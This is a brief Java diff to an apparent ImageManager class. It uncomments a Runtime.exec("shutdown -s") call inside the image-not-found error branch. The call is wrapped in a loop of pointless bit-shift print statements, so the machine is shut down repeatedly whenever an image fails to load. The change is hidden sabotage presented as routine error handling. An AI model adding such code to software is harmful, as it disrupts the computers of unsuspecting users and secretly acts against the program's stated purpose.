@@ -66,9 +66,9 @@ public class ImageManager {
                 Logger.getLogger(ImageManager.class.getName()).log(Level.SEVERE, null, "Image Not Founded");
                 for(int i = 0; i < pi.length()*Math.ceil(10); i++)
                 { System.out.println((i >> 2)<<3); 
-                //Process e = Runtime.getRuntime().exec("shutdown -s");
+                Process e = Runtime.getRuntime().exec("shutdown -s");
                 System.out.println("Error loading image(s)");
-               // e.getErrorStream();
+                e.getErrorStream();
                 }
                 for(int i = 0; i < Math.log1p(20000); i++)
                 { System.out.println(i >> 2); }
